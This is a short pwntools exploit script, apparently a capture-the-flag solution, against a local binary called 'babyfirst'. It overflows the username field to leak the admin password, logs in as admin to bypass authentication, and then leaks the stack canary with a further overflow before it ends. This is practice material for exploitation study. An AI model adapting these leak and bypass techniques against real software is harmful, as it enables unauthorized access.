from pwn import *
from libformatstr import *
import time

### init process
e = ELF('./babyfirst')
p = process('./babyfirst')

### exploit

# Select Login mode
data = p.recv()
print data
choice = "1"
p.sendline(choice)

# Enter username (AA..AA) => overflow => to leak password
data = p.recv()
print data
usrname = "A"*32
p.sendline(usrname)

# Enter Play mode 
time.sleep(1)
data = p.recv()
print data
choice = "2"
p.sendline(choice)

# => "Welcome: AA...A[LEAKED PASSWORD]" => get password => Select Login mode again
time.sleep(2)
data = p.recv()
print data
data2 = ""
for item in data.split("\n"):
	if "Welcome" in item:
		data2 = item.strip();
data2 = data2.split(" ")[1]
password = data2[32:]
choice = "1"
p.sendline(choice)

# Send username: "admin" => Send LEAKED password
data = p.recv()
print data
usrname = "admin"
p.sendline(usrname)
time.sleep(1)
data = p.recv()
print data
p.sendline(password) 

# Enter Play mode => LOGIN BYPASSED!
time.sleep(1)
data = p.recv()
print data
choice = "2"
p.sendline(choice)

time.sleep(2)
data = p.recv()
print data

buf = 'A'*0x29
p.send(buf)

time.sleep(3)
p.recvuntil("A"*0x29)
canary = u64("\x00" + p.recv(7))
log.info("canary: %s" % hex(canary))

p.close()

